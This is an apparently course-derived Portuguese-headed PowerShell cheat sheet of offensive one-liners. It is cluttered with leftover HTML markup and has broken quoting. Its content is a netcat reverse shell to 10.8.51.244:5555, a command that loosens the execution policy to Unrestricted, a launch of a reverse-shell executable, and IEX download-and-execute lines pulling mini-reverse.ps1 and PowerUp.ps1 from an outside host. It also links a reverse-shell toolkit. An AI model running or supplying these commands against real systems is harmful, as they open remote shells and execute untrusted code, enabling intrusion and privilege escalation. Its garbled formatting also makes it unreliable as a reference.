<div class="page">

# POWERSHELL

**

### EXECUTION

---

### POLICY

**


| 1 | 3 |   |   |   |   |   |   |
| --- | --- | --- | --- | --- | --- | --- | --- |
|   |   |   |   |   |   |   |   |
|   |   |   |   |   |   |   |   |
|   |   |   |   |   |   |   |   |
|   |   |   |   |   |   |   |   |
|   |   |   |   |   |   |   |   |



`<span style="background-color:#0000ff;">PS C:\</span>``<span style="background-color:#0000ff;">users</span>``<span style="background-color:#0000ff;">\</span>``<span style="background-color:#0000ff;">offsec</span>``<span style="background-color:#0000ff;">> Set-</span>``<span style="background-color:#0000ff;">ExecutionPolicy</span>`` <span style="background-color:#0000ff;">-Scope</span> ``<span style="background-color:#0000ff;">CurrentUser</span>`` <span style="background-color:#0000ff;">-</span>``<span style="background-color:#0000ff;">ExecutionPolicy</span>`` <span style="background-color:#0000ff;"></span> ``<span style="background-color:#0000ff;">UnRestricted</span>`

**

### EXECUTAR COMANDOS DE

---

### CMD

**

`<span style="background-color:#0000ff;">cmd</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>``<span style="background-color:#0000ff;">/c</span>``<span style="background-color:#0000ff;">nc</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>``<span style="background-color:#0000ff;">10.8.51.244 5555 -e</span>``<span style="background-color:#0000ff;">cmd</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>`` <span style="background-color:#0000ff;">/w

PS C:\></span> ``<span style="background-color:#0000ff;">cmd</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>`` <span style="background-color:#0000ff;">/c</span> ``<span style="background-color:#0000ff;">dir</span>`` <span style="background-color:#0000ff;">/w

PS C:\></span> ``<span style="background-color:#0000ff;">cmd</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>`` <span style="background-color:#0000ff;">--% /c</span> ``<span style="background-color:#0000ff;">dir</span>`` <span style="background-color:#0000ff;">/w

PS C:\></span> ``<span style="background-color:#0000ff;">cmd</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>`` <span style="background-color:#0000ff;"></span> ``<span style="color:#117d11;background-color:#0000ff;">--%</span>`` <span style="background-color:#0000ff;"></span> ``<span style="color:#117d11;background-color:#0000ff;">/c</span> ``<span style="color:#117d11;background-color:#0000ff;">dir</span>`` <span style="color:#117d11;background-color:#0000ff;">%</span>``<span style="color:#117d11;background-color:#0000ff;">WINDIR</span>``<span style="color:#117d11;background-color:#0000ff;">% /w</span>``<span style="background-color:#0000ff;"></span>`

**

### INICIAR

---

### EXECUTAVEIS

**

`<span style="background-color:#0000ff;">powershell</span>`` <span style="background-color:#0000ff;"></span> ``<span style="background-color:#0000ff;">Start</span>``<span style="background-color:#0000ff;">-</span>``<span style="background-color:#0000ff;">Process</span>`` <span style="background-color:#0000ff;"></span> ``<span style="background-color:#0000ff;">rev5555</span>``<span style="background-color:#0000ff;">.</span>``<span style="background-color:#0000ff;">exe</span>`

**

### DOWNLOAD

---

### AND

---

### EXECUTE

**

`<span style="background-color:#0000ff;">powershell</span>`` <span style="background-color:#0000ff;"></span> ``<span style="background-color:#0000ff;">IEX</span>`` <span style="background-color:#0000ff;">(</span>``<span style="background-color:#0000ff;">New</span>``<span style="background-color:#0000ff;">-</span>``<span style="background-color:#0000ff;">Object</span>`` <span style="background-color:#0000ff;">Net.</span>``<span style="background-color:#0000ff;">WebClient</span>``<span style="background-color:#0000ff;">).</span>``<span style="background-color:#0000ff;">DownloadString</span>``<span style="background-color:#0000ff;">('</span>`[http://192.168.119.160/mini-reverse.ps1')](http://192.168.119.160/mini-reverse.ps1'))
`<span style="background-color:#0000ff;">powershell -nop -c "IEX("New-Object Net.WebClient).DownloadString('</span>`[http://192.168.119.160/](http://192.168.119.160/mini-reverse.ps1'))`<span style="background-color:#0000ff;">PowerUp.ps1'; Invoke-AllChecks"</span> ``<span style="color:#ffa500;background-color:#0000ff;"></span>`**`<span style="color:#ffa500;background-color:#0000ff;">;?</span>`**

**

### Nishang

**- REVERSE POWERSHELL

[https://github.com/samratashok/nishang](https://github.com/samratashok/nishang)

</div>
